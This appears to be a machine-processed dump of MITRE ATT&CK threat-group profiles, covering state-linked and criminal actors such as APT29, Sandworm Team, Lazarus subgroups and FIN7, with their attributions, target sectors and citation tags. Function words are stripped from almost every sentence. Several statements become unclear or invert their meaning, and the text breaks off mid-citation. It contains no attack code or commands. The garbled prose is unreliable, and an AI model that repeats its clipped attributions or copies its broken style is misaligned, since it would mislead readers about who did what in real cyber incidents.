[menuPass](https://attack.mitre.org/groups/G0045) targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, government sectors globally, emphasis Japanese organizations. 2016 2017, targeted managed service providers (MSPs), manufacturing mining companies, university.(Citation: Palo Alto menuPass Feb 2017)(Citation: Crowdstrike CrowdCast Oct 2013)(Citation: FireEye Poison Ivy)(Citation: PWC Cloud Hopper April 2017)(Citation: FireEye APT10 April 2017)(Citation: DOJ APT10 Dec 2018)(Citation: District Court NY APT10 Indictment December 2018) [Night Dragon](https://attack.mitre.org/groups/G0014) campaign activity involving threat conducted activity originating China. (Citation: McAfee Night Dragon) [APT32](https://attack.mitre.org/groups/G0050) suspected Vietnam-based threat active 2014. targeted multiple private sector industries foreign governments, dissidents, journalists strong focus Southeast Asian countries Vietnam, Philippines, Laos, Cambodia. extensively strategic compromises compromise victims.(Citation: FireEye APT32 2017)(Citation: Volexity OceanLotus Nov 2017)(Citation: ESET OceanLotus) [HAFNIUM](https://attack.mitre.org/groups/G0125) state-sponsored cyber espionage operating China active January 2021. [HAFNIUM](https://attack.mitre.org/groups/G0125) targets entities industry sectors, including infectious disease researchers, law firms, education institutions, defense contractors, policy tanks, NGOs.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) cyber espionage assessed subordinate element Iran's Ministry Intelligence Security (MOIS).(Citation: CYBERCOM Iranian Intel Cyber January 2022) 2017, [MuddyWater](https://attack.mitre.org/groups/G0069) targeted range government private organizations sectors, including telecommunications, local government, defense, oil natural gas organizations, Middle East, Asia, Africa, Europe, North America.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022) [Strider](https://attack.mitre.org/groups/G0041) threat active 2011 targeted victims Russia, China, Sweden, Belgium, Iran, Rwanda.(Citation: Symantec Strider Blog)(Citation: Kaspersky ProjectSauron Blog) [Operation Wocao](https://attack.mitre.org/groups/G0116) activities carried China-based cyber espionage adversary. [Operation Wocao](https://attack.mitre.org/groups/G0116) targeted entities government, managed service providers, energy, health care, technology sectors countries, including China, France, Germany, United Kingdom, United States. [Operation Wocao](https://attack.mitre.org/groups/G0116) TTPs tools APT20, suggesting overlap.(Citation: FoxIT Wocao December 2019) [Naikon](https://attack.mitre.org/groups/G0019) assessed state-sponsored cyber espionage attributed Chinese People’s Liberation Army’s (PLA) Chengdu Military Region Technical Reconnaissance Bureau (Military Unit Cover Designator 78020).(Citation: CameraShy) Active 2010, [Naikon](https://attack.mitre.org/groups/G0019) conducted operations government, military, civil organizations Southeast Asia, international bodies United Nations Development Programme (UNDP) Association Southeast Asian Nations (ASEAN).(Citation: CameraShy)(Citation: Baumgartner Naikon 2015) 

While [Naikon](https://attack.mitre.org/groups/G0019) shares characteristics [APT30](https://attack.mitre.org/groups/G0013), exact matches.(Citation: Baumgartner Golovkin Naikon 2015) [FIN6](https://attack.mitre.org/groups/G0037) cyber crime stolen payment card data sold profit underground marketplaces. aggressively targeted compromised sale (PoS) systems hospitality retail sectors.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019) [Gamaredon Group](https://attack.mitre.org/groups/G0047) suspected Russian cyber espionage threat targeted military, NGO, judiciary, law enforcement, non-profit organizations Ukraine 2013. [Gamaredon Group](https://attack.mitre.org/groups/G0047) misspelling word "Armageddon", detected adversary's campaigns.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: Actinium February 2022)

In November 2021, Ukrainian government publicly attributed [Gamaredon Group](https://attack.mitre.org/groups/G0047) Russia's Federal Security Service (FSB) Center 18.(Citation: Bleepingcomputer Gamardeon FSB November 2021)(Citation: Actinium February 2022) [Moafee](https://attack.mitre.org/groups/G0002) threat appears operate Guandong Province China. overlapping TTPs, including custom tools, Moafee direct indirect relationship threat [DragonOK](https://attack.mitre.org/groups/G0017). (Citation: Haq 2014) [Gallmaker](https://attack.mitre.org/groups/G0084) cyberespionage targeted victims Middle East active December 2017. targeted victims defense, military, government sectors.(Citation: Symantec Gallmaker Oct 2018) [Leafminer](https://attack.mitre.org/groups/G0077) Iranian threat targeted government organizations business entities Middle East 2017. (Citation: Symantec Leafminer July 2018) [TeamTNT](https://attack.mitre.org/groups/G0139) threat targeted cloud containerized environments. active October 2019 focused efforts leveraging cloud container resources deploy cryptocurrency miners victim environments.(Citation: Palo Alto Black-T October 2020)(Citation: Lacework TeamTNT 2021)(Citation: Intezer TeamTNT September 2020)(Citation: Cado Security TeamTNT Worm August 2020)(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro TeamTNT)(Citation: ATT TeamTNT Chimaera September 2020)(Citation: Aqua TeamTNT August 2020)(Citation: Intezer TeamTNT Explosion September 2021) [FIN7](https://attack.mitre.org/groups/G0046) financially-motivated threat active 2013 targeting U.S. retail, restaurant, hospitality sectors, point-of-sale malware. portion [FIN7](https://attack.mitre.org/groups/G0046) company called Combi Security. 2020 [FIN7](https://attack.mitre.org/groups/G0046) shifted operations game hunting (BGH) approach including [REvil](https://attack.mitre.org/software/S0496) ransomware Ransomware Service (RaaS), Darkside. [FIN7](https://attack.mitre.org/groups/G0046) linked [Carbanak](https://attack.mitre.org/groups/G0008) Group, appears [Carbanak](https://attack.mitre.org/software/S0030) malware tracked separately.(Citation: FireEye FIN7 March 2017)(Citation: FireEye FIN7 April 2017)(Citation: FireEye CARBANAK June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) destructive threat attributed Russia's Staff Main Intelligence Directorate (GRU) Main Center Special Technologies (GTsST) military unit 74455.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020) active 2009.(Citation: iSIGHT Sandworm 2014)(Citation: CrowdStrike VOODOO BEAR)(Citation: USDOJ Sandworm Feb 2020)(Citation: NCSC Sandworm Feb 2020)

In October 2020, indicted GRU Unit 74455 officers [Sandworm Team](https://attack.mitre.org/groups/G0034) cyber operations: 2015 2016 attacks Ukrainian electrical companies government organizations, 2017 worldwide [NotPetya](https://attack.mitre.org/software/S0368) attack, targeting 2017 French presidential campaign, 2018 [Olympic Destroyer](https://attack.mitre.org/software/S0365) attack Winter Olympic Games, 2018 operation Organisation Prohibition Chemical Weapons, attacks country Georgia 2018 2019.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020) conducted assistance GRU Unit 26165, referred [APT28](https://attack.mitre.org/groups/G0007).(Citation: District Court Indictment GRU Oct 2018) [Machete](https://attack.mitre.org/groups/G0095) suspected Spanish-speaking cyber espionage active 2010. focused operations Latin America, emphasis Venezuela, US, Europe, Russia, Asia. [Machete](https://attack.mitre.org/groups/G0095) targets high-profile organizations government institutions, intelligence services, military units, telecommunications power companies.(Citation: Cylance Machete Mar 2017)(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020) [APT18](https://attack.mitre.org/groups/G0026) threat operated 2009 targeted range industries, including technology, manufacturing, human rights groups, government, medical. (Citation: Dell Lateral Movement) [Andariel](https://attack.mitre.org/groups/G0138) North Korean state-sponsored threat active 2009. [Andariel](https://attack.mitre.org/groups/G0138) focused operations--which included destructive attacks--against South Korean government agencies, military organizations, variety domestic companies; conducted cyber financial operations ATMs, banks, cryptocurrency exchanges. [Andariel](https://attack.mitre.org/groups/G0138)'s notable activity includes Operation Black Mine, Operation GoldenAxe, Campaign Rifle.(Citation: FSI Andariel Campaign Rifle July 2017)(Citation: IssueMakersLab Andariel GoldenAxe 2017)(Citation: AhnLab Andariel Subgroup Lazarus June 2018)(Citation: TrendMicro Andariel Tactics July 2018)(Citation: CrowdStrike Silent Chollima Adversary September 2021)

[Andariel](https://attack.mitre.org/groups/G0138) considered sub-set [Lazarus Group](https://attack.mitre.org/groups/G0032), attributed North Korea's Reconnaissance Bureau.(Citation: Treasury North Korean Cyber September 2019)

North Korean definitions overlap, security researchers report North Korean state-sponsored cyber activity [Lazarus Group](https://attack.mitre.org/groups/G0032) tracking clusters subgroups. [Sidewinder](https://attack.mitre.org/groups/G0121) suspected Indian threat actor active 2012. observed targeting government, military, business entities Asia, focusing Pakistan, China, Nepal, Afghanistan.(Citation: ATT Sidewinder January 2021)(Citation: Securelist APT Trends April 2018)(Citation: Cyble Sidewinder September 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) China-based cyber espionage threat actor observed 2017 conducting operations 2014. [Mustang Panda](https://attack.mitre.org/groups/G0129) targeted government entities, nonprofits, religious, non-governmental organizations U.S., Europe, Mongolia, Myanmar, Pakistan, Vietnam, others.(Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Secureworks BRONZE PRESIDENT December 2019)  [ZIRCONIUM](https://attack.mitre.org/groups/G0128) threat operating China, active 2017, targeted individuals 2020 presidential election prominent leaders international affairs community.(Citation: Targeting Elections September 2020)(Citation: Check APT31 February 2021) [Rocke](https://attack.mitre.org/groups/G0106) alleged Chinese-speaking adversary primary objective appeared cryptojacking, stealing victim resources purposes mining cryptocurrency. [Rocke](https://attack.mitre.org/groups/G0106) email address "rocke@live.cn" create wallet held collected cryptocurrency. Researchers detected overlaps [Rocke](https://attack.mitre.org/groups/G0106) Iron Cybercrime Group, attribution confirmed.(Citation: Talos Rocke August 2018) [APT39](https://attack.mitre.org/groups/G0087) names cyber espionage activity conducted Iranian Ministry Intelligence Security (MOIS) company Rana Intelligence Computing 2014. [APT39](https://attack.mitre.org/groups/G0087) targeted travel, hospitality, academic, telecommunications industries Iran Asia, Africa, Europe, North America track individuals entities considered threat MOIS.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)(Citation: FBI FLASH APT39 September 2020)(Citation: Dept. Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020) [APT37](https://attack.mitre.org/groups/G0067) North Korean state-sponsored cyber espionage active 2012. targeted victims South Korea, Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, Middle East. [APT37](https://attack.mitre.org/groups/G0067) linked campaigns 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil Year, Happy?, FreeMilk, North Korean Human Rights, Evil 2018.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft Jun 2016)(Citation: Talos Group123)

North Korean definitions overlap, security researchers report North Korean state-sponsored cyber activity [Lazarus Group](https://attack.mitre.org/groups/G0032) tracking clusters subgroups. [Moses Staff](https://attack.mitre.org/groups/G1009) suspected Iranian threat targeted Israeli companies September 2021. [Moses Staff](https://attack.mitre.org/groups/G1009) openly stated motivation attacking Israeli companies damage leaking stolen sensitive data encrypting victim's networks ransom demand.(Citation: Checkpoint MosesStaff Nov 2021) 

Security researchers assess [Moses Staff](https://attack.mitre.org/groups/G1009) politically motivated, targeted government, finance, travel, energy, manufacturing, utility companies Israel well, including Italy, India, Germany, Chile, Turkey, UAE, US.(Citation: Cybereason StrifeWater Feb 2022) [OilRig](https://attack.mitre.org/groups/G0049) suspected Iranian threat targeted Middle Eastern international victims 2014. targeted variety sectors, including financial, government, energy, chemical, telecommunications. appears carries supply chain attacks, leveraging trust relationship organizations attack primary targets. FireEye assesses behalf Iranian government based infrastructure details references Iran, Iranian infrastructure, targeting aligns nation-state interests.(Citation: Palo Alto OilRig April 2017)(Citation: ClearSky OilRig Jan 2017)(Citation: Palo Alto OilRig 2016)(Citation: Palo Alto OilRig Oct 2016)(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) [Windigo](https://attack.mitre.org/groups/G0124) operating 2011, compromising thousands Linux Unix servers [Ebury](https://attack.mitre.org/software/S0377) SSH backdoor create spam botnet. law enforcement intervention creators, [Windigo](https://attack.mitre.org/groups/G0124) operators continued updating [Ebury](https://attack.mitre.org/software/S0377) 2019.(Citation: ESET Windigo Mar 2014)(Citation: CERN Windigo June 2019) [Higaisa](https://attack.mitre.org/groups/G0126) threat suspected South Korean origins. [Higaisa](https://attack.mitre.org/groups/G0126) targeted government, public, trade organizations North Korea; however, carried attacks China, Japan, Russia, Poland, nations. [Higaisa](https://attack.mitre.org/groups/G0126) disclosed 2019 assessed operated 2009.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020)(Citation: PTSecurity Higaisa 2020) [Carbanak](https://attack.mitre.org/groups/G0008) cybercriminal [Carbanak](https://attack.mitre.org/software/S0030) malware target financial institutions 2013. [Carbanak](https://attack.mitre.org/groups/G0008) linked tracked separately [Cobalt Group](https://attack.mitre.org/groups/G0080) [FIN7](https://attack.mitre.org/groups/G0046) [Carbanak](https://attack.mitre.org/software/S0030) malware.(Citation: Kaspersky Carbanak)(Citation: FireEye FIN7 April 2017)(Citation: Europol Cobalt Mar 2018)(Citation: Secureworks GOLD NIAGARA Threat Profile)(Citation: Secureworks GOLD KINGSWOOD Threat Profile) [Tropic Trooper](https://attack.mitre.org/groups/G0081) unaffiliated threat led targeted campaigns targets Taiwan, Philippines, Hong Kong. [Tropic Trooper](https://attack.mitre.org/groups/G0081) focuses targeting government, healthcare, transportation, high-tech industries active 2011.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper 2020) [Orangeworm](https://attack.mitre.org/groups/G0071) targeted organizations healthcare sector United States, Europe, Asia 2015, purpose corporate espionage.(Citation: Symantec Orangeworm April 2018) [Taidoor](https://attack.mitre.org/groups/G0015) deprecated, technique linked deprecated ATT&CK v7. [Suckfly](https://attack.mitre.org/groups/G0039) China-based threat active 2014. (Citation: Symantec Suckfly March 2016) [Putter Panda](https://attack.mitre.org/groups/G0024) Chinese threat attributed Unit 61486 12th Bureau PLA’s 3rd Staff Department (GSD). (Citation: CrowdStrike Putter Panda) Operation [Sharpshooter](https://attack.mitre.org/groups/G0104) cyber espionage campaign discovered October 2018 targeting nuclear, defense, energy, financial companies. overlaps adversary [Lazarus Group](https://attack.mitre.org/groups/G0032) noted, definitive links established.(Citation: McAfee Sharpshooter December 2018) [POLONIUM](https://attack.mitre.org/groups/G1005) Lebanon-based targeted Israeli organizations, including critical manufacturing, technology, defense industry companies, February 2022. Security researchers assess [POLONIUM](https://attack.mitre.org/groups/G1005) coordinated operations multiple actors affiliated Iran’s Ministry Intelligence Security (MOIS), based victim overlap common techniques tooling.(Citation: POLONIUM June 2022) [TA459](https://attack.mitre.org/groups/G0062) threat believed operate China targeted countries including Russia, Belarus, Mongolia, others. (Citation: Proofpoint TA459 April 2017) [Aquatic Panda](https://attack.mitre.org/groups/G0143) suspected China-based threat dual mission intelligence collection industrial espionage. Active 2020, [Aquatic Panda](https://attack.mitre.org/groups/G0143) targeted entities telecommunications, technology, government sectors.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) suspected Chinese cyber espionage threat active 2013. [Aoqin Dragon](https://attack.mitre.org/groups/G1007) targeted government, education, telecommunication organizations Australia, Cambodia, Hong Kong, Singapore, Vietnam. Security researchers potential association [Aoqin Dragon](https://attack.mitre.org/groups/G1007) UNC94, based malware, infrastructure, targets.(Citation: SentinelOne Aoqin Dragon June 2022) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) threat targeted Persian-speaking individuals Iran 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021) [The White Company](https://attack.mitre.org/groups/G0089) state-sponsored threat actor advanced capabilities. 2017 2018, led espionage campaign called Operation Shaheen targeting government military organizations Pakistan.(Citation: Cylance Shaheen Nov 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) threat attributed actors operating China. [Ke3chang](https://attack.mitre.org/groups/G0004) targeted oil, government, diplomatic, military, NGOs Central South America, Caribbean, Europe, North America 2010.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong)(Citation: APT15 Intezer June 2018)(Citation: NICKEL December 2021) [APT1](https://attack.mitre.org/groups/G0006) Chinese threat attributed 2nd Bureau People’s Liberation Army (PLA) Staff Department’s (GSD) 3rd Department, commonly Military Unit Cover Designator (MUCD) Unit 61398. (Citation: Mandiant APT1) [Frankenstein](https://attack.mitre.org/groups/G0101) campaign carried January April 2019 unknown threat actors. campaign actors' ability piece unrelated components.(Citation: Talos Frankenstein June 2019)   [DarkHydrus](https://attack.mitre.org/groups/G0079) threat targeted government agencies educational institutions Middle East 2016. heavily leverages open-source tools custom payloads carrying attacks. (Citation: Unit 42 DarkHydrus July 2018) (Citation: Unit 42 Playbook Dec 2017) [Confucius](https://attack.mitre.org/groups/G0142) cyber espionage targeted military personnel, high-profile personalities, business persons, government organizations South Asia 2013. Security researchers similarities [Confucius](https://attack.mitre.org/groups/G0142) [Patchwork](https://attack.mitre.org/groups/G0040), respective custom malware code targets.(Citation: TrendMicro Confucius APT Feb 2018)(Citation: TrendMicro Confucius APT Aug 2021)(Citation: Uptycs Confucius APT Jan 2021) [BlackTech](https://attack.mitre.org/groups/G0098) suspected Chinese cyber espionage targeted organizations East Asia--particularly Taiwan, Japan, Hong Kong--and 2013. [BlackTech](https://attack.mitre.org/groups/G0098) combination custom malware, dual-use tools, living land tactics compromise media, construction, engineering, electronics, financial company networks.(Citation: TrendMicro BlackTech June 2017)(Citation: Symantec Palmerworm Sep 2020)(Citation: Reuters Taiwan BlackTech August 2020) [Leviathan](https://attack.mitre.org/groups/G0065) Chinese state-sponsored cyber espionage attributed Ministry Security's (MSS) Hainan Security Department affiliated company.(Citation: CISA AA21-200A APT40 July 2021) Active 2009, [Leviathan](https://attack.mitre.org/groups/G0065) targeted sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, transportation US, Canada, Europe, Middle East, Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018) [Group5](https://attack.mitre.org/groups/G0043) threat suspected Iranian nexus, attribution definite. targeted individuals connected Syrian opposition spearphishing watering holes, Syrian Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) commonly remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) [NanoCore](https://attack.mitre.org/software/S0336), Android RAT, DroidJack. (Citation: Citizen Lab Group5) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) cluster observed activity involving Monero cryptocurrency-mining payloads dynamic-link library (DLL) form Windows systems. earliest observed Blue Mockingbird tools created December 2019.(Citation: RedCanary Mockingbird 2020) [SilverTerrier](https://attack.mitre.org/groups/G0083) Nigerian threat active 2014. [SilverTerrier](https://attack.mitre.org/groups/G0083) targets organizations technology, education, manufacturing.(Citation: Unit42 SilverTerrier 2018)(Citation: Unit42 SilverTerrier 2016) [Dragonfly 2.0](https://attack.mitre.org/groups/G0074) suspected Russian targeted government entities multiple U.S. critical infrastructure sectors December 2015. (Citation: US-CERT TA18-074A) (Citation: Symantec Dragonfly Sept 2017) debate extent overlap [Dragonfly 2.0](https://attack.mitre.org/groups/G0074) [Dragonfly](https://attack.mitre.org/groups/G0035), sufficient evidence lead tracked separate groups. (Citation: Fortune Dragonfly 2.0 Sept 2017)(Citation: Dragos DYMALLOY ) [Stolen Pencil](https://attack.mitre.org/groups/G0086) threat originating DPRK active 2018. appears targeted academic institutions, motives remain unclear.(Citation: Netscout Stolen Pencil Dec 2018) [Turla](https://attack.mitre.org/groups/G0010) Russian-based threat infected victims 45 countries, spanning range industries including government, embassies, military, education, pharmaceutical companies 2004. Heightened activity mid-2015. [Turla](https://attack.mitre.org/groups/G0010) conducting watering hole spearphishing campaigns leveraging in-house tools malware. [Turla](https://attack.mitre.org/groups/G0010)’s espionage platform Windows machines, macOS Linux machines.(Citation: Kaspersky Turla)(Citation: ESET Gazer Aug 2017)(Citation: CrowdStrike VENOMOUS BEAR)(Citation: ESET Turla Mosquito Jan 2018) [Poseidon Group](https://attack.mitre.org/groups/G0033) Portuguese-speaking threat active 2005. history exfiltrated victims blackmail victim companies contracting [Poseidon Group](https://attack.mitre.org/groups/G0033) security firm. (Citation: Kaspersky Poseidon Group) [TA505](https://attack.mitre.org/groups/G0092) cyber criminal active 2014. [TA505](https://attack.mitre.org/groups/G0092) frequently changing malware, driving global trends criminal malware distribution, ransomware campaigns involving [Clop](https://attack.mitre.org/software/S0611).(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Proofpoint TA505 Jan 2019)(Citation: NCC TA505)(Citation: Korean FSI TA505 2020) [BITTER](https://attack.mitre.org/groups/G1002) suspected South Asian cyber espionage threat active 2013. [BITTER](https://attack.mitre.org/groups/G1002) targeted government, energy, engineering organizations Pakistan, China, Bangladesh, Saudi Arabia.(Citation: Cisco Talos Bitter Bangladesh 2022)(Citation: Forcepoint BITTER Pakistan Oct 2016) [DarkVishnya](https://attack.mitre.org/groups/G0105) financially motivated threat actor targeting financial institutions Eastern Europe. 2017-2018 attacked 8 banks region.(Citation: Securelist DarkVishnya Dec 2018) [FIN5](https://attack.mitre.org/groups/G0053) financially motivated threat targeted personally identifiable payment card information. active 2008 targeted restaurant, gaming, hotel industries. actors speak Russian. (Citation: FireEye Respond Webinar July 2017) (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015) [Mofang](https://attack.mitre.org/groups/G0103) China-based cyber espionage group, named frequent practice imitating victim's infrastructure. adversary observed 2012 conducting focused attacks government critical infrastructure Myanmar, countries sectors including military, automobile, weapons industries.(Citation: FOX-IT 2016 Mofang) [Lotus Blossom](https://attack.mitre.org/groups/G0030) threat targeted government military organizations Southeast Asia. (Citation: Lotus Blossom Jun 2015) [Stealth Falcon](https://attack.mitre.org/groups/G0038) threat conducted targeted spyware attacks Emirati journalists, activists, dissidents 2012. Circumstantial evidence suggests link United Arab Emirates (UAE) government, confirmed. (Citation: Citizen Lab Stealth Falcon 2016) [APT29](https://attack.mitre.org/groups/G0016) threat attributed Russia's Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs April 2021)(Citation: Malign RIS Activity April 2021) operated 2008, targeting government networks Europe NATO countries, institutes, tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised Democratic National Committee starting summer 2015.(Citation: F-Secure Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: Exposes Russia SolarWinds April 2021)

In April 2021, governments attributed SolarWinds supply chain compromise cyber operation SVR; public statements included citations [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: NSCS Russia SolarWinds April 2021) Victims campaign included government, consulting, technology, telecom, organizations North America, Europe, Asia, Middle East. Industry reporting referred actors involved campaign UNC2452, NOBELIUM, StellarParticle, Dark Halo.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: MSTIC NOBELIUM Mar 2021)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Volexity SolarWinds)(Citation: Cybersecurity Advisory SVR TTP 2021) [Dark Caracal](https://attack.mitre.org/groups/G0070) threat attributed Lebanese Directorate Security (GDGS) operated 2012. (Citation: Lookout Dark Caracal Jan 2018) [Chimera](https://attack.mitre.org/groups/G0114) suspected China-based threat active 2018 targeting semiconductor industry Taiwan data airline industry.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [Cleaver](https://attack.mitre.org/groups/G0003) threat attributed Iranian actors responsible activity tracked Operation Cleaver. (Citation: Cylance Cleaver) Strong circumstantial evidence suggests Cleaver linked Threat 2889 (TG-2889). (Citation: Dell Threat 2889) [Silent Librarian](https://attack.mitre.org/groups/G0122) targeted proprietary data universities, government agencies, private sector companies worldwide 2013.  [Silent Librarian](https://attack.mitre.org/groups/G0122) affiliated Iran-based Mabna Institute conducted cyber intrusions behest government Iran, Islamic Revolutionary Guard Corps (IRGC).(Citation: DOJ Iran Indictments March 2018)(Citation: Phish Labs Silent Librarian)(Citation: Malwarebytes Silent Librarian October 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) cyber espionage Chinese origins active 2008. targets Japanese organizations, government, biotechnology, electronics manufacturing, industrial chemistry.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) [TA551](https://attack.mitre.org/groups/G0127) financially-motivated threat active 2018. (Citation: Secureworks GOLD CABIN) targeted English, German, Italian, Japanese speakers email-based malware distribution campaigns. (Citation: Unit 42 TA551 Jan 2021) [TEMP.Veles](https://attack.mitre.org/groups/G0088) Russia-based threat targeted critical infrastructure. observed utilizing [TRITON](https://attack.mitre.org/software/S0609), malware framework designed manipulate industrial safety systems.(Citation: FireEye TRITON 2019)(Citation: FireEye TEMP.Veles 2018)(Citation: FireEye TEMP.Veles JSON April 2019) [Equation](https://attack.mitre.org/groups/G0020) sophisticated threat employs multiple remote access tools. zero-day exploits developed capability overwrite firmware hard disk drives. (Citation: Kaspersky Equation QA) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) cyber espionage threat active 2017. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) targeted Ministries Foreign Affairs telecommunication companies Africa, Europe, Middle East, Asia.(Citation: ESET BackdoorDiplomacy Jun 2021) [Gelsemium](https://attack.mitre.org/groups/G0141) cyberespionage active 2014, targeting governmental institutions, electronics manufacturers, universities, religious organizations East Asia Middle East.(Citation: ESET Gelsemium June 2021) [Darkhotel](https://attack.mitre.org/groups/G0012) suspected South Korean threat targeted victims East Asia 2004. group's based cyber espionage operations conducted hotel Internet networks traveling executives select guests. [Darkhotel](https://attack.mitre.org/groups/G0012) conducted spearphishing campaigns infected victims peer-to-peer file sharing networks.(Citation: Kaspersky Darkhotel)(Citation: Securelist Darkhotel Aug 2015)(Citation: Digital Defense FY20 Sept 2020) [Axiom](https://attack.mitre.org/groups/G0001) suspected Chinese cyber espionage targeted aerospace, defense, government, manufacturing, media sectors 2008. reporting suggests degree overlap [Axiom](https://attack.mitre.org/groups/G0001) [Winnti Group](https://attack.mitre.org/groups/G0044) distinct based differences reporting TTPs targeting.(Citation: Kaspersky Winnti April 2013)(Citation: Kaspersky Winnti June 2015)(Citation: Novetta Winnti April 2015) [Deep Panda](https://attack.mitre.org/groups/G0009) suspected Chinese threat target industries, including government, defense, financial, telecommunications. (Citation: Alperovitch 2014) intrusion healthcare company Anthem attributed [Deep Panda](https://attack.mitre.org/groups/G0009). (Citation: ThreatConnect Anthem) Crew, WebMasters, KungFu Kittens, PinkPanther. (Citation: RSA Crew) [Deep Panda](https://attack.mitre.org/groups/G0009) appears Black Vine based attribution names Anthem intrusion. (Citation: Symantec Black Vine) analysts track [Deep Panda](https://attack.mitre.org/groups/G0009) [APT19](https://attack.mitre.org/groups/G0073) group, unclear source same. (Citation: ICIT China's Espionage Jul 2016) [Ember Bear](https://attack.mitre.org/groups/G1003) suspected Russian state-sponsored cyber espionage active March 2021. [Ember Bear](https://attack.mitre.org/groups/G1003) focused operations Ukraine Georgia, targeted Western European North American foreign ministries, pharmaceutical companies, financial sector organizations. Security researchers assess [Ember Bear](https://attack.mitre.org/groups/G1003) conducted [WhisperGate](https://attack.mitre.org/software/S0689) destructive wiper attacks Ukraine 2022.(Citation: CrowdStrike Ember Bear Profile March 2022)(Citation: Mandiant UNC2589 March 2022)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )  [LazyScripter](https://attack.mitre.org/groups/G0140) threat targeted airlines industry 2018, open-source toolsets.(Citation: MalwareBytes LazyScripter Feb 2021) [Dust Storm](https://attack.mitre.org/groups/G0031) threat targeted multiple industries Japan, South Korea, United States, Europe, Southeast Asian countries. (Citation: Cylance Dust Storm) [Windshift](https://attack.mitre.org/groups/G0112) threat active 2017, targeting specific individuals surveillance government departments critical infrastructure Middle East.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019) [Volatile Cedar](https://attack.mitre.org/groups/G0123) Lebanese threat targeted individuals, companies, institutions worldwide. [Volatile Cedar](https://attack.mitre.org/groups/G0123) operating 2012 motivated political ideological interests.(Citation: CheckPoint Volatile Cedar March 2015)(Citation: ClearSky Lebanese Cedar Jan 2021) [Whitefly](https://attack.mitre.org/groups/G0107) cyber espionage operating 2017. targeted organizations based Singapore wide variety sectors, stealing amounts sensitive information. linked attack Singapore’s largest public health organization, SingHealth.(Citation: Symantec Whitefly March 2019) [CostaRicto](https://attack.mitre.org/groups/G0132) suspected hacker-for-hire cyber espionage campaign targeted multiple industries worldwide 2019. [CostaRicto](https://attack.mitre.org/groups/G0132)'s targets, portion financial institutions, scattered Europe, Americas, Asia, Australia, Africa, concentration South Asia.(Citation: BlackBerry CostaRicto November 2020) [APT28](https://attack.mitre.org/groups/G0007) threat attributed Russia's Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) active 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy 